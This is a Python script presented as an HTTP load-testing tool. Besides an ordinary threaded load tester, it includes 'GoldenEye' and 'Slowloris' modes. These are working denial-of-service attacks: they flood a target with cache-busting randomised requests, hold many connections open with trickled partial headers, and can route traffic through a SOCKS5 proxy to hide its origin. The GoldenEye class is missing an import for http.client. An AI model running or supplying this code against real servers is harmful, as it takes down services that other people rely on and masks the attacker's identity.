#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import ssl
import sys
import time
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from multiprocessing import Process, Manager
from urllib.parse import urlparse

# Global configurations
DEBUG = False
SSLVERIFY = True
JOIN_TIMEOUT = 1.0
DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 500
DEFAULT_URL = "https://test.com"

# List of modern user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
]

class LoadTester:
    def __init__(self):
        self.useragents = USER_AGENTS
        self.nr_workers = DEFAULT_WORKERS
        self.nr_sockets = DEFAULT_SOCKETS
        self.method = 'get'

    def send_request(self, url, request_timeout=5):
        headers = {
            'User-Agent': random.choice(self.useragents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        try:
            session = requests.Session()
            response = session.request(
                self.method.upper(),
                url,
                headers=headers,
                timeout=request_timeout,
                allow_redirects=True,
                verify=SSLVERIFY
            )
            return {'status': response.status_code, 'url': url, 'success': True, 'error': None}
        except requests.RequestException as e:
            return {'status': None, 'url': url, 'success': False, 'error': str(e)}

    def print_result(self, result, current, total, numeric=False):
        if numeric:
            return
        prefix = f"[{current}/{total}]"
        if result['success']:
            print(f"\033[92m{prefix} ✓ Success {result['status']}\033[0m | {result['url']}")
        else:
            print(f"\033[91m{prefix} ✗ Error: {result['error']}\033[0m | {result['url']}")

    def load_test(self, urls, total_requests, max_threads=10, request_timeout=5, numeric=False, metric='total_requests'):
        results = []
        for url in urls:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc or parsed.scheme not in ['http', 'https']:
                print(f"❌ Error: Invalid URL format for {url}. Please include http:// or https://")
                continue
            if not numeric:
                print(f"\n🚀 Starting load test for: {url}")
                print(f"📨 Total requests: {total_requests}")
                print(f"🔗 Threads: {max_threads}")
                print(f"⏱️ Timeout: {request_timeout}s")
                print("=" * 60)
            start_time = time.time()
            success_count = 0
            failure_count = 0
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = [executor.submit(self.send_request, url, request_timeout) for _ in range(total_requests)]
                for i, future in enumerate(as_completed(futures), start=1):
                    result = future.result()
                    self.print_result(result, i, total_requests, numeric)
                    if result['success']:
                        success_count += 1
                    else:
                        failure_count += 1
            total_time = time.time() - start_time
            rps = total_requests / total_time if total_time > 0 else 0
            if numeric:
                if metric == 'total_requests':
                    print(total_requests)
                elif metric == 'successful':
                    print(success_count)
                elif metric == 'failed':
                    print(failure_count)
                elif metric == 'rps':
                    print(f"{rps:.2f}")
            else:
                print("\n✅ Load test completed")
                print("=" * 60)
                print(f"⏱️ Total time: {total_time:.2f} seconds")
                print(f"🟢 Successful: {success_count}")
                print(f"🔴 Failed: {failure_count}")
                print(f"⚡ Requests per second: {rps:.2f} rps")
                print("=" * 60)
            results.append({
                'url': url,
                'total_requests': total_requests,
                'successful': success_count,
                'failed': failure_count,
                'rps': rps
            })
        return results

class Striker(Process):
    def __init__(self, url, nr_sockets, counter):
        super().__init__()
        self.counter = counter
        self.nr_socks = nr_sockets
        self.url = None
        self.host = None
        self.port = 80
        self.ssl = False
        self.referers = []
        self.useragents = USER_AGENTS
        self.socks = []
        self.runnable = True
        self.method = 'get'
        parsed_url = urllib.parse.urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            raise ValueError("Invalid URL format. Please include http:// or https://")
        self.ssl = parsed_url.scheme == 'https'
        self.host = parsed_url.netloc.split(':')[0]
        self.url = parsed_url.path or '/'
        self.port = parsed_url.port or (443 if self.ssl else 80)
        self.referers = [
            'http://www.google.com/', 'http://www.bing.com/', 'http://www.baidu.com/',
            'http://www.yandex.com/', f"http://{self.host}/"
        ]

    def buildblock(self, size):
        return ''.join(chr(random.choice(list(range(97, 122)) + list(range(65, 90)) + list(range(48, 57)))) for _ in range(size))

    def run(self):
        if DEBUG:
            logging.debug(f"Starting worker {self.name}")
        while self.runnable:
            try:
                for _ in range(self.nr_socks):
                    context = ssl._create_unverified_context() if not SSLVERIFY else ssl.create_default_context()
                    c = http.client.HTTPSConnection(self.host, self.port, context=context) if self.ssl else http.client.HTTPConnection(self.host, self.port)
                    self.socks.append(c)
                for conn_req in self.socks:
                    url, headers = self.create_payload()
                    method = random.choice(['GET', 'POST']) if self.method == 'random' else self.method.upper()
                    conn_req.request(method, url, None, headers)
                for conn_resp in self.socks:
                    conn_resp.getresponse()
                    self.inc_counter()
                self.close_connections()
            except Exception as e:
                self.inc_failed()
                if DEBUG:
                    logging.error(f"Worker error: {e}")
        if DEBUG:
            logging.debug(f"Worker {self.name} completed.")

    def close_connections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass
        self.socks = []

    def create_payload(self):
        req_url, headers = self.generate_data()
        random_keys = list(headers.keys())
        random.shuffle(random_keys)
        return req_url, {k: headers[k] for k in random_keys}

    def generate_query_string(self, amount=1):
        return '&'.join(f"{self.buildblock(random.randint(3,10))}={self.buildblock(random.randint(3,20))}" for _ in range(amount))

    def generate_data(self):
        param_joiner = "&" if "?" in self.url else "?"
        request_url = self.url + param_joiner + self.generate_query_string(random.randint(1,5))
        return request_url, self.generate_random_headers()

    def generate_random_headers(self):
        no_cache_directives = ['no-cache', 'max-age=0']
        random.shuffle(no_cache_directives)
        accept_encoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
        random.shuffle(accept_encoding)
        http_headers = {
            'User-Agent': random.choice(self.useragents),
            'Cache-Control': ', '.join(no_cache_directives[:random.randint(1, len(no_cache_directives)-1)]),
            'Accept-Encoding': ', '.join(accept_encoding[:random.randint(1, len(accept_encoding)//2)]),
            'Connection': 'keep-alive',
            'Keep-Alive': str(random.randint(1,1000)),
            'Host': self.host,
        }
        if random.randrange(2) == 0:
            accept_charset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
            random.shuffle(accept_charset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(
                accept_charset[0], accept_charset[1], round(random.random(), 1), round(random.random(), 1))
        if random.randrange(2) == 0:
            url_part = self.buildblock(random.randint(5,10))
            random_referer = random.choice(self.referers) + url_part
            if random.randrange(2) == 0:
                random_referer += '?' + self.generate_query_string(random.randint(1, 10))
            http_headers['Referer'] = random_referer
        if random.randrange(2) == 0:
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-www-form-urlencoded'])
        if random.randrange(2) == 0:
            http_headers['Cookie'] = self.generate_query_string(random.randint(1, 5))
        return http_headers

    def inc_counter(self):
        try:
            self.counter[0] += 1
        except:
            pass

    def inc_failed(self):
        try:
            self.counter[1] += 1
        except:
            pass

    def stop(self):
        self.runnable = False
        self.close_connections()
        self.terminate()

class GoldenEye:
    def __init__(self, url):
        self.manager = Manager()
        self.counter = self.manager.list((0, 0))
        self.workers_queue = []
        self.url = url
        self.nr_workers = DEFAULT_WORKERS
        self.nr_sockets = DEFAULT_SOCKETS
        self.method = 'get'

    def fire(self):
        print("\n🌟 GoldenEye v2.1 - HTTP Load Tester\n")
        print(f"Hitting {self.url} with {self.nr_workers} workers running {self.nr_sockets} connections each.")
        for _ in range(self.nr_workers):
            try:
                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = USER_AGENTS
                worker.method = self.method
                self.workers_queue.append(worker)
                worker.start()
            except Exception as e:
                if DEBUG:
                    logging.error(f"Failed to start worker: {e}")
        self.monitor()

    def stats(self):
        if self.counter[0] > 0 or self.counter[1] > 0:
            print(f"{self.counter[0]} GoldenEye strikes hit. ({self.counter[1]} Failed)")
            if self.counter[0] > 0 and self.counter[1] > 0:
                print("\tServer may be under heavy load!")

    def monitor(self):
        while self.workers_queue:
            try:
                for worker in self.workers_queue[:]:
                    if worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workers_queue.remove(worker)
                self.stats()
            except (KeyboardInterrupt, SystemExit):
                print("CTRL+C received. Killing all workers")
                for worker in self.workers_queue:
                    try:
                        worker.stop()
                    except:
                        pass
                if DEBUG:
                    raise
                break

class Slowloris:
    def __init__(self, host, port=80, sockets=150, sleeptime=15, https=False, randuseragent=False, useproxy=False, proxy_host="127.0.0.1", proxy_port=8080):
        self.host = host
        self.port = port
        self.sockets = sockets
        self.sleeptime = sleeptime
        self.https = https
        self.randuseragent = randuseragent
        self.useproxy = useproxy
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.list_of_sockets = []
        self.user_agents = USER_AGENTS
        if self.useproxy:
            try:
                import socks
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, self.proxy_host, self.proxy_port)
                socket.socket = socks.socksocket
                logging.info("Using SOCKS5 proxy for connecting...")
            except ImportError:
                logging.error("PySocks library not installed. Install with: pip install PySocks")
                sys.exit(1)
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d-%m-%Y %H:%M:%S", level=logging.DEBUG if DEBUG else logging.INFO)
        if self.https:
            setattr(ssl.SSLSocket, "send_line", lambda self, line: self.send(f"{line}\r\n".encode("utf-8")))
            setattr(ssl.SSLSocket, "send_header", lambda self, name, value: self.send_line(f"{name}: {value}"))
        setattr(socket.socket, "send_line", lambda self, line: self.send(f"{line}\r\n".encode("utf-8")))
        setattr(socket.socket, "send_header", lambda self, name, value: self.send_line(f"{name}: {value}"))

    def init_socket(self, ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if self.https:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE if not SSLVERIFY else ssl.CERT_REQUIRED
                s = ctx.wrap_socket(s, server_hostname=self.host)
            s.connect((ip, self.port))
            s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
            ua = self.user_agents[0] if not self.randuseragent else random.choice(self.user_agents)
            s.send_header("User-Agent", ua)
            s.send_header("Accept-language", "en-US,en,q=0.5")
            return s
        except socket.error as e:
            logging.debug(f"Socket initialization failed: {e}")
            return None

    def slowloris_iteration(self):
        logging.info("Sending keep-alive headers...")
        logging.info("Socket count: %s", len(self.list_of_sockets))
        for s in self.list_of_sockets[:]:
            try:
                s.send_header("X-a", random.randint(1, 5000))
            except socket.error:
                self.list_of_sockets.remove(s)
        diff = self.sockets - len(self.list_of_sockets)
        if diff > 0:
            logging.info("Creating %s new sockets...", diff)
            for _ in range(diff):
                s = self.init_socket(self.host)
                if s:
                    self.list_of_sockets.append(s)

    def attack(self):
        logging.info("Attacking %s with %s sockets.", self.host, self.sockets)
        logging.info("Creating sockets...")
        for _ in range(self.sockets):
            s = self.init_socket(self.host)
            if s:
                self.list_of_sockets.append(s)
        while True:
            try:
                self.slowloris_iteration()
                logging.debug("Sleeping for %d seconds", self.sleeptime)
                time.sleep(self.sleeptime)
            except (KeyboardInterrupt, SystemExit):
                logging.info("Stopping Slowloris")
                break
            except Exception as e:
                logging.debug(f"Error in Slowloris iteration: {e}")

def read_urls_from_file(file_path):
    """Read URLs from a file, one per line, ignoring empty lines and comments."""
    urls = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    urls.append(line)
        return urls
    except FileNotFoundError:
        print(f"❌ Error: URL file '{file_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Error reading URL file: {e}")
        sys.exit(1)

def prompt_for_url():
    """Prompt the user to input a URL interactively."""
    while True:
        url = input(f"Please enter a target URL (e.g., {DEFAULT_URL}, press Enter for default): ").strip()
        if not url:
            return DEFAULT_URL
        parsed = urlparse(url)
        if parsed.scheme in ['http', 'https'] and parsed.netloc:
            return url
        print(f"❌ Error: Invalid URL format for {url}. Please include http:// or https:// (e.g., {DEFAULT_URL})")

def prompt_for_requests():
    """Prompt the user to input the number of requests interactively."""
    while True:
        try:
            requests_input = input("Please enter the number of requests (positive integer): ").strip()
            total_requests = int(requests_input)
            if total_requests <= 0:
                print("❌ Error: Number of requests must be positive.")
                continue
            return total_requests
        except ValueError:
            print("❌ Error: Please enter a valid positive integer for the number of requests.")

def main():
    parser = argparse.ArgumentParser(
        description="Powerful HTTP Load Testing Tool",
        epilog="Examples:\n"
               "  Single URL with command-line requests: python v2.py https://test.com --mode=loadtest -n 50\n"
               "  Interactive mode: python v2.py --mode=loadtest\n"
               "  Numeric output: python v2.py https://test.com --mode=loadtest --numeric --metric total_requests\n"
               "  Multiple URLs from file: python v2.py --url-file urls.txt --mode=loadtest -n 200\n"
               "  Multiple URLs via command: python v2.py https://test.com https://test.com --mode=loadtest -n 200",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("urls", nargs='*', help="Target URL(s) (e.g., https://test.com)")
    parser.add_argument("--url-file", help="File containing URLs, one per line")
    parser.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS, help="Number of workers (default: 10)")
    parser.add_argument("-s", "--sockets", type=int, default=DEFAULT_SOCKETS, help="Number of sockets per worker (default: 500)")
    parser.add_argument("-m", "--method", choices=['get', 'post', 'random'], default='get', help="HTTP method (default: get)")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Request timeout in seconds (default: 5)")
    parser.add_argument("-n", "--requests", type=int, help="Total number of requests per URL")
    parser.add_argument("--mode", choices=['loadtest', 'goldeneye', 'slowloris'], default='loadtest', help="Testing mode (default: loadtest)")
    parser.add_argument("--https", action="store_true", help="Force HTTPS (optional, detected from URL)")
    parser.add_argument("--slowloris", action="store_true", help="Use Slowloris mode (deprecated, use --mode=slowloris)")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode (disables SSL verification)")
    parser.add_argument("--randuseragent", action="store_true", help="Randomize user agents")
    parser.add_argument("--useproxy", action="store_true", help="Use SOCKS5 proxy")
    parser.add_argument("--proxy-host", default="127.0.0.1", help="Proxy host (default: 127.0.0.1)")
    parser.add_argument("--proxy-port", type=int, default=8080, help="Proxy port (default: 8080)")
    parser.add_argument("--sleeptime", type=int, default=15, help="Slowloris sleep time in seconds (default: 15)")
    parser.add_argument("--numeric", action="store_true", help="Output only numeric results for loadtest mode")
    parser.add_argument("--metric", choices=['total_requests', 'successful', 'failed', 'rps'], default='total_requests', help="Metric to output in numeric mode (loadtest only)")
    args = parser.parse_args()

    global DEBUG, SSLVERIFY
    DEBUG = args.debug
    SSLVERIFY = not args.debug

    # Validate numeric flag usage
    if args.numeric and args.mode != 'loadtest':
        print("❌ Error: --numeric is only supported in loadtest mode.")
        sys.exit(1)

    # Collect URLs
    urls = []
    if args.url_file:
        urls.extend(read_urls_from_file(args.url_file))
    if args.urls:
        urls.extend(args.urls)
    if not urls:
        print("⚠️ No URLs provided. Please specify a URL or use --url-file.")
        urls.append(prompt_for_url())

    # Validate URLs
    valid_urls = []
    for url in urls:
        parsed = urlparse(url)
        if parsed.scheme in ['http', 'https'] and parsed.netloc:
            valid_urls.append(url)
        else:
            print(f"❌ Error: Invalid URL format for {url}. Please include http:// or https://")
    if not valid_urls:
        print("❌ Error: No valid URLs provided. Exiting.")
        sys.exit(1)

    # Handle requests input for loadtest mode
    total_requests = None
    if args.mode == 'loadtest':
        if args.requests is not None:
            if args.requests <= 0:
                print("❌ Error: Number of requests must be positive.")
                sys.exit(1)
            total_requests = args.requests
        else:
            total_requests = prompt_for_requests()
    else:
        # For non-loadtest modes, use a default or skip since they don't use total_requests
        total_requests = args.requests if args.requests is not None else 100

    if args.slowloris:
        args.mode = 'slowloris'

    if args.mode == 'loadtest':
        tester = LoadTester()
        tester.nr_workers = args.workers
        tester.nr_sockets = args.sockets
        tester.method = args.method
        tester.load_test(valid_urls, total_requests, args.workers, args.timeout, args.numeric, args.metric)
    elif args.mode == 'goldeneye':
        for url in valid_urls:
            try:
                goldeneye = GoldenEye(url)
                goldeneye.nr_workers = args.workers
                goldeneye.nr_sockets = args.sockets
                goldeneye.method = args.method
                goldeneye.fire()
            except ValueError as e:
                print(f"❌ Error for {url}: {e}")
    elif args.mode == 'slowloris':
        for url in valid_urls:
            parsed = urlparse(url)
            host = parsed.netloc.split(':')[0]
            port = parsed.port or (443 if args.https or parsed.scheme == 'https' else 80)
            slowloris = Slowloris(
                host=host,
                port=port,
                sockets=args.sockets,
                sleeptime=args.sleeptime,
                https=args.https or parsed.scheme == 'https',
                randuseragent=args.randuseragent,
                useproxy=args.useproxy,
                proxy_host=args.proxy_host,
                proxy_port=args.proxy_port
            )
            slowloris.attack()

if __name__ == "__main__":
    main()